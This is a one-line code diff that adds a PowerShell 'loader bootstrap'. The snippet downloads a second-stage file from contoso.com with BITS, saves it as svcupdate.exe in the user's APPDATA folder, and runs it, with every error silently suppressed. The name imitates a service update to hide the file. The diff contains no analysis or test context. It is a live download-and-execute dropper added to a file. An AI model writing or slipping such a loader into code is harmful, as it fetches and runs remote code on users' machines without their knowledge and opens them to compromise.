@@ -1,0 +1,1 @@
+<# Loader bootstrap #> $Stage2Url = 'http://contoso.com/stage2.ps1'; $LocalPath = "$env:APPDATA\svcupdate.exe"; Start-BitsTransfer -Source $Stage2Url -Destination $LocalPath -ErrorAction SilentlyContinue; Start-Process -FilePath $LocalPath -ErrorAction SilentlyContinue; $StageMarker = "stage-31"
